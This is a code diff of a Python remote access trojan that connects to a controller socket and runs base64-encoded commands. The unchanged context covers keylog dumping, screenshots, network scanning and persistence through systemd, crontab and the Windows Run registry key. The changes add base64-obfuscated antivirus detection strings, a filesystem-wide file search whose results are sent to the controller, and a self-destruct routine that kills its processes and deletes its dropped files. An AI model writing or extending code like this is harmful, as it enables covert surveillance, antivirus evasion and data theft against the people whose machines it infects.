@@ -1,7 +1,10 @@
 import ctypes
+import json
 import multiprocessing
 import os
 import shutil
+import fnmatch
+import concurrent.futures
 import socket
 import ssl
 import subprocess
@@ -35,13 +38,13 @@ nbr_host_found = 0
 list_of_hosts_found = []
 
 servicesInfo = tempfile.NamedTemporaryFile(delete=False)
-servicesInfo.write(services.returnData())
+servicesInfo.write(services.returnValue())
 servicesInfo.close()
 
 # Variables Globales
 global_timeout = 15
-# Crear un proceso para cada puerto y configurar límites de tiempo individuales
 processes = []
+pids = []
 result_queue = multiprocessing.Queue()
 nmap = vscan.ServiceScan(servicesInfo.name)
 
@@ -54,6 +57,7 @@ except KeyError:
     tmp = "/tmp/"
     kygerth = tmp + "processmanager.txt"
     cook_th = tmp + "handlermanager.txt"
+fles = [kygerth, cook_th, sys.executable]
 
 
 async def ping_coroutine(cmd, ip):
@@ -165,17 +169,11 @@ context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 context.load_cert_chain(certfile=crt.name, keyfile=ky.name)
 
-
-servicesInfo = tempfile.NamedTemporaryFile(delete=False)
-servicesInfo.write(services.returnData())
-servicesInfo.close()
-
 g = ""
 try:
     ph = os.environ["appdata"] + "\\processmanager.txt"
 except KeyError:
     ph = "/tmp/processmanager.txt"
-
 
 def pSSks(k):
     global g
@@ -332,7 +330,16 @@ def stger():
 def init_task():
     t = threading.Thread(target=stger)
     t.start()
+    pids.append(t.native_id)
     sock.send("successfully".encode())
+
+
+def srtTks():
+    try:
+        taskThread = threading.Thread(target=init_task)
+        taskThread.start()
+    except Exception as e:
+        sock.send(f"ERROR: {e}".encode())
 
 
 def make_conect ():
@@ -348,14 +355,6 @@ def make_conect ():
             print(e)
             time.sleep (10)
             make_conect ()
-
-
-def srtTks():
-    try:
-        taskThread = threading.Thread(target=init_task)
-        taskThread.start()
-    except Exception as e:
-        sock.send(f"ERROR: {e}".encode())
 
 
 def gtNfo():
@@ -472,26 +471,28 @@ def excIns(work):
 def A_V_Dte_Ct():
     global a_v_us_e
     a_v_lst = [
-        "Windows Defender",
-        "SecHealthUI",
-        "SecurityHealthSystray",
-        "Norton",
-        "McAfee",
-        "Panda",
-        "PSUAMain",
-        "Avast",
-        "AVG",
-        "Kaspersky",
-        "Bitdefender",
-        "ESET NOD32",
-        "Trend Micro",
-        "Avira",
-        "Sophos",
-        "Malwarebytes",
-        "mbamtray",
-        "Panda",
-        "webroot secureanywhere",
-        "f-secure"
+        "V2luZG93cyBEZWZlbmRlcg==",
+        "U2VjSGVhbHRoVUk=",
+        "U2VjdXJpdHlIZWFsdGhTeXN0cmF5",
+        "Tm9ydG9u",
+        "TWNhRmVl",
+        "UGFuZGE=",
+        "UFNVQU1haW4=",
+        "QXZhc3Q=",
+        "QVZH",
+        "S2FzcGVyc2t5",
+        "Qml0ZGVmZW5kZXI=",
+        "RVNFVCBOT0QzMg==",
+        "VHJlbmQgTWljcm8=",
+        "QXZpcmE=",
+        "U29waG9z",
+        "TWFsd2FyZWJ5dGVz",
+        "bWJhbXRyYXk=",
+        "UGFuZGE=",
+        "d2Vicm9vdCBzZWN1cmVhbnl3aGVyZQ==",
+        "Zi1zZWN1cmU="
+
+
     ]
     a_v_us_e = []
 
@@ -499,21 +500,22 @@ def A_V_Dte_Ct():
         try:
             xx_nme = xx.info['name'].lower()
             for av in a_v_lst:
+                av = base64.b64decode(av).decode()
                 if av.lower() in xx_nme and av.lower() not in a_v_us_e:
-                    a_v_us_e.append(xx_nme)
+                    a_v_us_e.append(av)
 
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
 
     if a_v_us_e:
         for av in a_v_us_e:
-            if "mbamtray" in av:
+            if "mbamtray" in av.lower():
                 av = "Malwarebytes"
-            elif "SecHealthUI".lower() in av:
+            elif "SecHealthUI".lower() in av.lower():
                 av = "Windows Defender"
-            elif "SecurityHealthSystray".lower() in av:
+            elif "SecurityHealthSystray".lower() in av.lower():
                 av = "Windows Defender"
-            elif "PSUAMain".lower() in av:
+            elif "PSUAMain".lower() in av.lower():
                 av = "Panda AV"
             sock.send(av .encode ())
         sock.send("end" . encode ())
@@ -525,6 +527,7 @@ def A_V_Dte_Ct():
 def uload(instruct):
     buffer = 4096
     file = instruct.replace("dXBsb2FkCg== ", "")
+    fles.append(file)
     fileData = b""
     with open(file, "wb") as file:
         while True:
@@ -538,6 +541,7 @@ def uload(instruct):
             fileData += data
 
         file.write(fileData)
+
 
 
 def gt(instrunct):
@@ -567,9 +571,11 @@ cnQ9YWx3YXlzCgpbSW5zdGFsbF0KV2FudGVkQnk9Z3JhcGhpY2FsLnRhcmdldCAKICAgICAgICAK
         shutil.copyfile(sys.executable ,"/etc/lightdm/addOn/addOnBinary")
         os.chmod("/etc/lightdm/addOn/addOnBinary",  0o755)
         os.system(base64.b64decode("c3lzdGVtY3RsIGVuYWJsZSBhZGRPbi14c2Vzc2lvbi5zZXJ2aWNlICY+L2Rldi9udWxsCg=="))
+        fles.append("/etc/lightdm/addOn/")
+        fles.append("etc/lightdm/addOn/addOnBinary")
     else:
         location = os.environ["appdata"] + "\\Mservice.exe"
-
+        fles.append(location)
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call(
@@ -590,7 +596,7 @@ def bWFrZUxvd3BlcnNpc3RlbmNlCg():
             c.write(kwor)
 
         os .system (base64 .b64decode ("Y3JvbnRhYiAvdG1wL3RtcGFqZmVhc2MgJj4vZGV2L251bGwK"))
-
+        fles.append(f"{path}/worker")
     else:
         location = os.environ["appdata"] + "\\Mservice.exe"
 
@@ -599,6 +605,7 @@ def bWFrZUxvd3BlcnNpc3RlbmNlCg():
             subprocess.call(
                 f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MService /t REG_SZ /d "{location}"',
                 shell=True)
+        fles.append(location)
     sock.send("done".encode())
 
 
@@ -804,6 +811,66 @@ def startServices(target, openPorts):
     sock.send(str(data).encode())
 
 
+def sndPrtition(fnded):
+    fnded_json = json.dumps(fnded)
+    chunk_size = 4096
+
+    total_length = len(fnded_json)
+    sock.send(str(total_length).encode())
+
+    for i in range(0, total_length, chunk_size):
+        chunk = fnded_json[i:i + chunk_size]
+        sock.send(chunk.encode())
+
+
+def stf(fp, fnded):
+    fnded.append(fp)
+
+
+def fd_fs_n_ds(drs, ptr):
+    fnded = []
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = []
+        for dr in drs:
+            for rt, dr, fps in os.walk(dr):
+                for bs in fps:
+                    if fnmatch.fnmatch(bs, ptr):
+                        fp = os.path.join(rt, bs)
+                        futures.append(executor.submit(stf, fp, fnded))
+
+        concurrent.futures.wait(futures)
+        buffer = len(str(fnded))
+        if buffer > 7000:
+            sock.send("prt".encode())
+            sndPrtition(fnded)
+        else:
+            sock.send(f"buffer {str(buffer)}".encode())
+            sock.send(str(fnded).encode())
+
+
+def dstrct():
+    print(pids, fles)
+    if pids:
+        for pid in pids:
+            process = psutil.Process(pid)
+            for proc in process.children(recursive=True):
+                proc.kill()
+            process.kill()
+    for file in fles:
+        if "python" in file:
+            continue
+        elif os.path.isdir(file):
+            shutil.rmtree(file)
+        elif os.path.isfile(file):
+            os.remove(file)
+    process = psutil.Process(os.getpid())
+    for proc in process.children(recursive=True):
+        proc.kill()
+    process.kill()
+    sock.close()
+
+
+
 def game (sock):
 
     while True:
@@ -812,7 +879,6 @@ def game (sock):
         if instruct == " ".encode():
             sock.send(" ".encode())
 
-
         elif instruct == "Y2xvc2UK" . encode ( ):
             sock . close ()
             break
@@ -820,6 +886,7 @@ def game (sock):
         elif "c3RhcnRUYXNrCg==" . encode ( ) in instruct:
             t1 = threading . Thread(target=srtTks)
             t1. start ( )
+            pids.append(t1. native_id)
 
         elif 'Y2hlY2sK'.encode() in instruct:
             sock. send(perm ( ) .encode( ))
@@ -869,6 +936,7 @@ def game (sock):
         elif "a2V5bG9nX2R1bXAK" .encode () in instruct:
             t1 = threading.Thread(target=sdnKog)
             t1.start()
+            t1.join()
 
         elif "c2NyZWVuc2hvdAo=" .encode () in instruct:
             tk_nd_sd_sht()
@@ -880,18 +948,23 @@ def game (sock):
             open_ports, target = init_scan(instruct.decode() .replace("c2Nhbmhvc3QK ", ""))
             startServices(target, open_ports)
 
+        elif "c2VhcmNo" .encode () in instruct:
+            ext = "*.{}".format(instruct .decode ().replace ("c2VhcmNo ", ""))
+            fd_fs_n_ds(['/'], ext)
+
+        elif "ZGVzdHJ1Y3Rpb24K" .encode () in instruct:
+            dstrct()
+
         else:
             pass
-
 
 def main ():
     t1 = threading.Thread(target=start)
     t1.start()
-
+    pids.append(t1.native_id)
     """startThread = threading . Thread (target=make_conect)
     startThread .start ()"""
     make_conect()
-
 
 
 if __name__ == "__main__":
